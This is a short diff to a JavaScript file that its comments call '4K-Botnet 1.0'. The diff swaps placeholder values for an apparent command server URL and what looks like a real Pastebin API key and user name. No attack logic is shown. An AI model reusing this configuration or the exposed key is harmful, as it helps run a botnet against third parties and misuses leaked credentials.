@@ -1,8 +1,8 @@
 //4K-Botnet 1.0 by Chowix40
 //I know it's still crap but it (or should) works better
-var SERVER_URL = 'http://example.net/Botnet/'
-var api_dev_key = '<pastebin api_dev_key here>'
-var api_user_key = '<pastebin api_user_key here>'
+var SERVER_URL = 'https://psbotnet.chilloxop.repl.co'
+var api_dev_key = 'tSZ0XJEbkQhEh9ys_UYUo5TG23KM_yUM'
+var api_user_key = 'chilloxop'
 
 
 
